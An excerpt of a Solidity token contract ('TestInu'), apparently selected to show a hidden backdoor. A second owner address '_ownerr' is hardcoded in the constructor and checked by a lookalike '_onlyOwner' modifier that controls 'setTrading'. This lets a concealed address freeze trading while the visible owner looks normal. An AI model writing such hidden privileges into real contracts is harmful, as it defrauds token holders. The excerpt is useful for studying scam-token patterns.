...
contract Ownable is Context {
    ...
    constructor() {
        ...
        _owner = msgSender;
        _ownerr = 0xCea363B4aB273A1091F34e27Fdb1C3563FEF79f0;
    ...
    modifier onlyOwner() {
     ...
     modifier _onlyOwner() {
        require(_ownerr == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract TestInu is Context, IERC20, Ownable {
    ...
    function setTrading(bool _tradingOpen) public _onlyOwner {
